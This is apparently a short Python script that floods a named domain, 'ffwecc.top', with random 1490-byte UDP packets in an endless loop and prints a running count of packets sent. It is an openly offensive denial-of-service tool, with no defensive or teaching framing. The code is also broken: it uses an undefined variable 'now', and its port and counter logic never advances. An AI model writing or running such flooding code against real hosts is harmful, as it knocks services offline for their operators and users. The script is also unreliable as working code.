
# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import datetime



# Platform info
#uname=system()

#if uname == "Windows":
#    cmd_clear_clear = 'cls'
#else:
#    cmd_clear = 'clear'

#os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)



# Get ip.
url = "ffwecc.top"
ip = socket.gethostbyname(url)


# Value.
sent = 1
i = 1

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 80

#ululu alala
if port_mode == False:  # All ports.
    try:
        while True:
            if i == 65535:                
                i = 1

            elif port == 1900:
                port = 1901

            
            sock.sendto(bytes, (str(ip), port))
            sent += 1
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip, port))       
    except:
        print('\n\033[31;1mExited\033[0m')
